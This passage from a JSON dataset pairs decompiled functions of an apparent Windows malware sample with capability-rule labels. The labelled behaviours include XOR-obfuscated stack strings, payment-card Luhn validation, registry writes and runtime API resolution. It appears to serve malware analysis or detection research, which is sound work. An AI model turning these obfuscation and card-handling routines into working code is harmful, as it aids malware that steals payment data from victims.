        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00404ca4(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_22h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41ca90;\n    var_14h = param_1;\n    if (*0x41cae4 == NULL) {\n        var_4ch = 0x7a1a0821;\n        var_48h = 0xc093356;\n        var_44h = 0x30130e2e;\n        var_40h = 0x42543b02;\n        var_3ch = 0x71e1e21;\n        var_38h = 0x291f0e12;\n        var_34h = 0x20e0201;\n        var_30h._0_2_ = 0x6222;\n        var_1ch = 0x4c6d6776;\n        var_18h._0_1_ = 0x62;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_8h = 5;\n        iVar7 = 0;\n        var_10h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar4 != 0xa3a6d4) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_4ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_2ch = 0x361a0102;\n        var_28h._0_1_ = 8;\n        var_28h._1_1_ = 5;\n        stack0xffffffd6 = 0x9765a57;\n        var_22h._1_2_ = 0x6808;\n        var_1ch = 0x58686469;\n        var_18h._0_1_ = 0x6d;\n        var_22h._0_1_ = var_28h._1_1_;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n            iVar4 = var_10h;\n            if (iVar5 != 0xbd5435) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_2ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_10h);\n        *0x41cae4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41cae4;\n        if (*0x41cae4 == NULL) goto code_r0x00404e19;\n    }\n    iVar3 = var_14h;\n    pcVar6 = (**0x41cae4)(var_14h);\n    if (pcVar6 != '\\0') {\n        *0x41ca90 = iVar3 != 0;\n    }\ncode_r0x00404e19:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1138
    },
    "00405f66": {
        "rules": [
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00405f66(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    hHeap = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, hHeap * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, hHeap * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_14h = fcn.0040494b();\n                var_14h = var_14h + 2;\n                var_30h = 0x5a247315;\n                var_2ch = 0x731e381a;\n                var_28h = 0x380e5a2a;\n                var_24h = 0x5a487344;\n                var_20h = 0x5a487330;\n                var_1ch._0_2_ = 0x386f;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_18h = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                    if (iVar3 != 0x42606b) {\n                        var_10h = 6;\n                        *(iVar4 + iVar2) = *(&var_20h + iVar4 % 6) ^ (iVar4 + iVar2)[&var_30h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, iVar2, uVar1);\n                (*pcVar5)(hHeap, 0x4103ac, lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_78h = 0x37192754;\n                    var_74h = 0x4073571e;\n                    var_70h = 0x20185737;\n                    var_6ch = 0x151f684d;\n                    var_68h = 0x7a744876;\n                    var_64h = 0x3048693f;\n                    var_60h._0_2_ = 0x3f7a;\n                    var_60h._2_1_ = 0x37;\n                    var_60h._3_1_ = 8;\n                    var_5ch = 0x76105729;\n                    var_58h = 0x5c7d485c;\n                    var_54h = 0xf204d35;\n                    var_50h = 0x6519205c;\n                    var_4ch = 0x4d621052;\n                    var_48h = 0x3c411822;\n                    var_44h = 0x3802604d;\n                    var_40h = 0x1b200959;\n                    var_3ch = 0x75487615;\n                    var_38h._0_2_ = 0x3f7a;\n                    var_38h._2_1_ = 0x53;\n                    var_20h = 0x456d5335;\n                    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x77);\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_14h = &var_78h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.USER32.dll_GetInputState)();\n                        if (iVar2 != 0x49ffe) {\n                            var_14h = 5;\n                            *(iVar4 + iVar3) = *(&var_20h + iVar4 % 5) ^ (iVar4 + iVar3)[&var_78h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_10h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_10h, var_10h);\n                    iVar4 = fcn.00403b78(nNumberOfBytesToWrite);\n                    iVar2 = var_18h;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.00405db6(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1741
    },
    "00406314": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "accept command line arguments",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406314(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_c4h;\n    uint var_c0h;\n    int16_t *var_bch;\n    int16_t *var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t hKey;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_c4h = 1;\n    var_28h = 0x4453663c;\n    var_24h = 0x36077851;\n    var_20h = 0x66143731;\n    var_1ch = 0x787e4442;\n    var_18h = 0x37373608;\n    var_14h = 0x4457660c;\n    var_10h = 0x360a785b;\n    var_ch._0_2_ = 0x3744;\n    var_48h = 0x44366678;\n    var_44h._0_1_ = 0x37;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_b4h = 5;\n    var_c0h = 0;\n    iVar8 = 0;\n    var_b8h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar5 != 0x37164b) {\n            *(iVar8 + piVar4) = *(&var_48h + iVar8 % var_b4h) ^ (iVar8 + piVar4)[&var_28h - piVar4];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    var_b0h = 0x48585534;\n    var_ach = 0x5513392c;\n    var_a8h = 0x392b4840;\n    var_a4h = 0x48525515;\n    var_a0h = 0x552a3916;\n    var_9ch = 0x3929485e;\n    var_98h = 0x48585515;\n    var_94h = 0x55083939;\n    var_90h = 0x393e4851;\n    var_8ch = 0x487e553b;\n    var_88h = 0x5526390f;\n    var_84h = 0x3916487c;\n    var_80h = 0x48455520;\n    var_7ch = 0x55123925;\n    var_78h = 0x391a4847;\n    var_74h = 0x485b5508;\n    var_70h = 0x55043923;\n    var_6ch = 0x3916484e;\n    var_68h = 0x48525537;\n    var_64h = 0x55033924;\n    var_60h = 0x3924485e;\n    var_5ch = 0x48705500;\n    var_58h = 0x5528391a;\n    var_54h = 0x394a4844;\n    var_8h = 0x48375567;\n    var_4h._0_2_ = 0x394a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_30h = 6;\n    iVar5 = 0;\n    var_48h = iVar8;\n    var_34h = &var_b0h - iVar8;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar6 != 0xf057dd) {\n            *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_30h) ^ (iVar5 + iVar8)[&var_b0h - iVar8];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    hKey = fcn.0040a452(0x20006);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (hKey != 0) {\n        var_40h = 0x4f16532d;\n        var_3ch = 0x793d6e10;\n        var_38h = 0x536e653b;\n        var_8h = 0x4f79536e;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x65);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_4ch = &var_40h - iVar8;\n        var_34h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar6 != 0xc8aa0a) {\n                *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_b4h) ^ (iVar5 + iVar8)[&var_40h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_18h = 0x701b3562;\n        var_14h = 0x355a7226;\n        var_10h = 0x7252704b;\n        var_3ch = 0x707a3532;\n        var_38h = CONCAT22(var_38h._2_2_, 0x7252);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_4ch = &var_18h - iVar8;\n        var_8h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n            if (iVar6 != 0x268425) {\n                *(iVar5 + iVar8) = *(&var_3ch + iVar5 % var_30h) ^ (iVar5 + iVar8)[&var_18h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_1ch = 0x563f4104;\n        var_18h = 0x5a35571a;\n        var_14h = 0x4138793f;\n        var_10h = 0x57485634;\n        var_ch._0_2_ = 0x5a41;\n        var_30h = 0x565a4157;\n        var_2ch._0_1_ = 0x79;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_4ch = &var_1ch - iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar6 != 0x443d42) {\n                *(iVar5 + iVar8) = *(&var_30h + iVar5 % var_b4h) ^ (iVar5 + iVar8)[&var_1ch - iVar8];\n            }\n            pcVar7 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_34h, 0, 4, &var_c4h, 4);\n        iVar5 = var_8h;\n        piVar4 = var_bch;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_c0h);\n        (*pcVar7)(hKey, var_8h, 0, 1, var_bch, (piVar4 - (var_bch + 1) >> 1) * 2);\n        var_8h = var_b8h + 1;\n        piVar4 = var_b8h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_c0h);\n        (*pcVar7)(hKey, iVar8, 0, 1, var_b8h, (piVar4 - var_8h >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, iVar5);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar7)(0, var_34h);\n        (*pcVar2)(uVar3);\n        iVar8 = var_48h;\n    }\n    piVar4 = var_b8h;\n    uVar3 = (*pcVar7)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 2612
    },
    "00406897": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406897(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    int32_t iVar8;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5bh;\n    uint32_t var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint32_t var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uchar *pszFirst;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0;\n    pszFirst = puVar4;\n    fcn.0040aff8();\n    if (puVar4 == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_78h = 0x66105740;\n        var_74h = 0x57354e36;\n        var_70h = 0x4e276615;\n        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_6ch = 0x66105731;\n        var_68h = 0x57394e43;\n        var_64h = 0x4e0f661c;\n        var_14h = 6;\n        var_60h._0_1_ = 6;\n        stack0xffffff9d = 0x9662357;\n        var_5bh = 0x3e57164e;\n        var_57h = 0x114e0066;\n        var_53h = 0x2f660d57;\n        var_4fh = 0x25570b4e;\n        var_4bh = 0x174e0366;\n        var_47h = 0x3663f57;\n        var_43h = 0x7157114e;\n        var_3fh = 0x1d4e2366;\n        var_3bh._0_1_ = 0x57;\n        var_3bh._1_1_ = 0x21;\n        var_3bh._2_1_ = 0x66;\n        var_3bh._3_1_ = 10;\n        var_37h._0_2_ = 0xa4e;\n        var_37h._2_1_ = 0x57;\n        var_37h._3_1_ = 0x23;\n        var_33h._0_2_ = 0x366;\n        var_33h._2_1_ = 0x4e;\n        var_33h._3_1_ = 0x17;\n        var_2fh._0_2_ = 0xd57;\n        var_2fh._2_1_ = 0x66;\n        var_2fh._3_1_ = 0x66;\n        var_2bh._0_1_ = 0x4e;\n        stack0xffffffd4 = 0x66515765;\n        var_24h._0_2_ = 0x4e66;\n        uVar3 = (*pcVar1)(8, 0x9d);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        var_ch = iVar7;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            if (iVar5 != 0xe4d8cb) {\n                *(iVar8 + iVar7) = *(&var_2bh + iVar8 % var_14h + 3) ^ (iVar8 + iVar7)[&var_78h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, pszFirst, 0x104);\n        var_4bh = var_4bh & 0xffffff | 0x30000000;\n        var_47h = 0x7453276;\n        var_43h = 0x204b0243;\n        var_3fh = 0x3b762e74;\n        var_3bh._0_1_ = 0x45;\n        var_3bh._1_1_ = 6;\n        var_3bh._2_1_ = 0x43;\n        var_3bh._3_1_ = 0x19;\n        var_37h._0_2_ = 0x234b;\n        var_37h._2_1_ = 0x74;\n        var_37h._3_1_ = 0x2a;\n        var_33h._0_2_ = 0x2776;\n        var_33h._2_1_ = 0x45;\n        var_33h._3_1_ = 0x11;\n        var_2fh._0_2_ = 0x7643;\n        var_2fh._2_1_ = 0x4b;\n        stack0xffffffd4 = 0x454b7643;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x74);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 5;\n        iVar5 = 0;\n        iVar8 = &var_4bh + (3 - iVar7);\n        var_18h = iVar7;\n        var_14h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetCursor)();\n            puVar4 = pszFirst;\n            if (iVar6 != 0xf65e87) {\n                *(iVar5 + iVar7) = *(&var_2bh + iVar5 % var_8h + 3) ^ (iVar5 + iVar7)[iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1c);\n        iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar7);\n        if (iVar8 != 0) {\n            var_57h = var_57h & 0xffffff | 0x14000000;\n            var_53h = 0x4f36256f;\n            var_4fh = 0x42761c31;\n            var_4bh = 0x1b6f5436;\n            var_47h = 0x316436;\n            var_43h = 0x45365976;\n            var_3fh = 0x6a36536f;\n            var_3bh._0_1_ = 0x31;\n            var_3bh._1_1_ = 0x3b;\n            var_3bh._2_1_ = 0x76;\n            var_3bh._3_1_ = 0x57;\n            var_37h._0_2_ = 0x4236;\n            var_37h._2_1_ = 0x6f;\n            var_37h._3_1_ = 0x1d;\n            var_33h._0_2_ = 0x4536;\n            var_33h._2_1_ = 0x31;\n            var_33h._3_1_ = 0x33;\n            var_2fh._0_2_ = 0x3676;\n            var_2fh._2_1_ = 0x36;\n            stack0xffffffd4 = 0x36766f31;\n            var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x36);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar5 = 0;\n            iVar8 = &var_57h + (3 - iVar7);\n            var_14h = iVar8;\n            do {\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                puVar4 = pszFirst;\n                if (iVar6 != 0x9a2a68) {\n                    *(iVar5 + iVar7) = *(&var_2bh + iVar5 % var_8h + 3) ^ (iVar5 + iVar7)[iVar8];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, pszFirst, 0x104);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar7 = var_18h;\n        }\n        iVar8 = var_ch;\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar4, *0x41cb64);\n        uVar3 = extraout_ECX;\n        iVar5 = fcn.00403b78(var_1ch);\n        if (iVar5 == 0) {\n            fcn.00405db6(uVar3);\n            fcn.0040372d();\n            var_10h = fcn.00406750();\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar7);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar1)(uVar3);\n    }\n    return var_10h;\n}\n",
        "token_count": 2529
    },
    "00407210": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407210(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_14h = *0x412430;\n    var_48h = 0x34573612;\n    var_44h = 0x3635732f;\n    var_40h = 0x7328344f;\n    var_3ch = 0x345d3633;\n    var_38h = 0x360c7315;\n    var_34h = 0x732a3451;\n    var_30h = 0x34573633;\n    var_2ch = 0x362e733a;\n    var_28h = 0x733d345e;\n    var_24h._0_2_ = 0x3641;\n    var_20h = 0x34383641;\n    var_1ch._0_2_ = 0x7349;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_18h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar3 != 0x571727) {\n            var_ch = 6;\n            *(iVar5 + iVar2) = *(&var_20h + iVar5 % 6) ^ (iVar5 + iVar2)[&var_48h - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar2, 0, 0xf003f, &var_4h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        var_40h = 0x66035625;\n        var_3ch = 0x773a6617;\n        var_38h = 0x5609652a;\n        var_34h = 0x66286610;\n        var_30h = 0x651e7737;\n        var_2ch = 0x661e5635;\n        var_28h = 0x7733661f;\n        var_24h._0_2_ = 0x6566;\n        var_ch = 0x66775666;\n        var_8h._0_1_ = 0x65;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        hKey = &var_40h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n            if (iVar3 != 0x211f72) {\n                hKey = 5;\n                *(iVar5 + iVar2) = *(&var_ch + iVar5 % 5) ^ (iVar5 + iVar2)[&var_40h - iVar2];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, iVar2, 0, 4, &var_14h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        iVar2 = var_18h;\n    }\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 1072
    },
    "00407928": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407928(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint *var_90h;\n    uint *var_8ch;\n    uint var_84h;\n    uint hObject;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    int32_t lpLibFileName;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_35h;\n    uint32_t var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint32_t var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpszLongPath;\n    \n    